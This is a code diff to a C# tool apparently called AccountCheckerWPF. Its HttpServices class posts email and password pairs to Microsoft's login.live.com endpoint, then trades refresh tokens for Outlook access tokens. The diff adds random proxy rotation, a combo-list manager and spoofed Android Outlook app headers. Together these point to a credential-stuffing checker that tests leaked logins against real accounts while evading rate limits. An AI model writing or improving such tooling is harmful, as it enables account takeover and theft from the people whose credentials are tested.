@@ -2,6 +2,7 @@ using System.Net;
 using System.Net.Http;
 using System.Net.Http.Headers;
 using System.Text;
+using AccountCheckerWPF.Managers;
 using AccountCheckerWPF.Services.Interface;
 
 namespace AccountCheckerWPF.Services;
@@ -10,9 +11,17 @@ public class HttpServices : IHttpServices
 {
     private readonly HttpClient _httpClient;
 
-    public HttpServices(HttpClient httpClient)
+    public HttpServices(ProxyManager proxyManager, ComboManager comboManager)
     {
-        _httpClient = httpClient;
+        var cookieContainer = new CookieContainer();
+
+        var httpClientHandler = proxyManager.GetRandomProxyTransport(out _);
+        httpClientHandler.CookieContainer = cookieContainer;
+
+        _httpClient = new HttpClient(httpClientHandler)
+        {
+            Timeout = TimeSpan.FromSeconds(10)
+        };
     }
 
     public async Task<HttpResponseMessage> SendGetRequestAsync()
@@ -31,8 +40,7 @@ public class HttpServices : IHttpServices
     {
         var contentPost =
             $"i13=1&login={WebUtility.UrlEncode(email)}&loginfmt={WebUtility.UrlEncode(email)}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={WebUtility.UrlEncode(password)}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=Passp&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&i19=41679";
-        var contentBytes = new StringContent(contentPost, Encoding.UTF8,
-            "application/x-www-form-urlencoded");
+        var contentBytes = new StringContent(contentPost, Encoding.UTF8, "application/x-www-form-urlencoded");
 
         var postRequest = new HttpRequestMessage(HttpMethod.Post,
             $"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={WebUtility.UrlEncode(email)}&contextid={contextid}&bk={bk}&uaid={uaid}&pid=15216")
@@ -46,19 +54,19 @@ public class HttpServices : IHttpServices
         {
             MaxAge = TimeSpan.Zero
         };
+        postRequest.Headers.Add("Origin", "https://login.live.com");
+        postRequest.Headers.Add("User-Agent",
+            "Mozilla/5.0 (Linux; Android 9; SM-G9880 Build/PQ3A.190705.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Safari/537.36");
         postRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
         postRequest.Headers.Referrer = new Uri("https://login.live.com");
         postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("text/html"));
-        postRequest.Headers.Accept.Add(
-            new MediaTypeWithQualityHeaderValue("application/xhtml+xml"));
-        postRequest.Headers.Accept.Add(
-            new MediaTypeWithQualityHeaderValue("application/xml", 0.9));
+        postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("application/xhtml+xml"));
+        postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("application/xml", 0.9));
         postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("image/avif", 0.8));
         postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("image/webp", 0.8));
         postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("image/apng", 0.8));
         postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("*/*", 0.8));
-        postRequest.Headers.Accept.Add(
-            new MediaTypeWithQualityHeaderValue("application/signed-exchange", 0.9));
+        postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("application/signed-exchange", 0.9));
         postRequest.Headers.Add("X-Requested-With", "com.microsoft.office.outlook");
         postRequest.Headers.Add("Sec-Fetch-Site", "same-origin");
         postRequest.Headers.Add("Sec-Fetch-Mode", "navigate");
@@ -72,10 +80,9 @@ public class HttpServices : IHttpServices
         return await _httpClient.SendAsync(postRequest);
     }
 
+
     public async Task<HttpResponseMessage> SendPostRequestToGetAccessTokenAsync(string refreshToken)
     {
-        using var client = new HttpClient();
-
         var requestMessage = new HttpRequestMessage(HttpMethod.Post, "https://login.live.com/oauth20_token.srf");
         requestMessage.Headers.TryAddWithoutValidation("x-ms-sso-Ignore-SSO", "1");
         requestMessage.Headers.TryAddWithoutValidation("User-Agent", "Outlook-Android/2.0");
@@ -91,6 +98,6 @@ public class HttpServices : IHttpServices
 
         requestMessage.Content = content;
 
-        return await client.SendAsync(requestMessage);
+        return await _httpClient.SendAsync(requestMessage);
     }
 }
